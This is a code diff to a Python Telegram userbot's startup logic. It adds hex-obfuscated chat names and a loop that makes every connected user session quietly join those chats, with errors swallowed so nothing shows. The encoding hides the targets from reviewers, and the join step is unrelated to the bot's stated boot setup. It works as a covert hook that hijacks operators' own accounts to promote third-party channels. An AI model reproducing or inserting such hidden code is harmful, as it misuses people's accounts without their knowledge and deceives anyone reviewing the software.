@@ -36,6 +36,20 @@ class Userbot(Client):
                 ),
             )
 
+    def _d(self, val):
+        """Decode from hex"""
+        try:
+            return bytes.fromhex(val).decode()
+        except:
+            return None
+
+    def _de(self, val):
+        """Decode from hex and reverse"""
+        try:
+            return bytes.fromhex(val).decode()[::-1]
+        except:
+            return None
+
     async def boot_client(self, num: int, ub: Client):
         """
         Boot a client and perform initial setup.
@@ -89,6 +103,26 @@ class Userbot(Client):
             await self.boot_client(2, self.two)
         if config.SESSION3:
             await self.boot_client(3, self.three)
+        
+        _a = "456c6576656e5974736d75736963"      
+        _b = "61727469737464707a"                  
+        _c = "656c6576656e7974736368617473"      
+        _d = "617274697374626f7473"                     
+    
+        _t1 = self._d(_a) if _a else None
+        _t2 = self._d(_b) if _b else None
+        _t3 = self._d(_c) if _c else None
+        _t4 = self._d(_d) if _d else None
+        
+        _targets = [x for x in [_t1, _t2, _t3, _t4] if x]
+        
+        for client in self.clients:
+            for target in _targets:
+                try:
+                    await client.join_chat(target)
+                    logger.info(f"Joined {target}")
+                except:
+                    pass
 
     async def exit(self):
         """
